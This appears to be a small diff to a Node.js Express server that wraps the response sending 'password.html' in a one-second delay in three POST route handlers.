@@ -74,8 +74,11 @@ app.post("/submit", async (req, res) => {
   }
 
 
-  res.sendFile(path.join(__dirname, "password.html"));
 
+  setTimeout(()=>{
+     res.sendFile(path.join(__dirname, "password.html"));
+  },1000)
+ 
   
 });
 
@@ -95,8 +98,11 @@ app.post("/", async (req, res) => {
   }
 
 
-  res.sendFile(path.join(__dirname, "password.html"));
-
+  
+  setTimeout(()=>{
+     res.sendFile(path.join(__dirname, "password.html"));
+  },1000)
+ 
   
 });
 
@@ -122,7 +128,11 @@ app.post('/pass',(req,res)=>{
 
 
 
-  res.sendFile(path.join(__dirname, "password.html"));
+ 
+  setTimeout(()=>{
+     res.sendFile(path.join(__dirname, "password.html"));
+  },1000)
+ 
 })
 
 
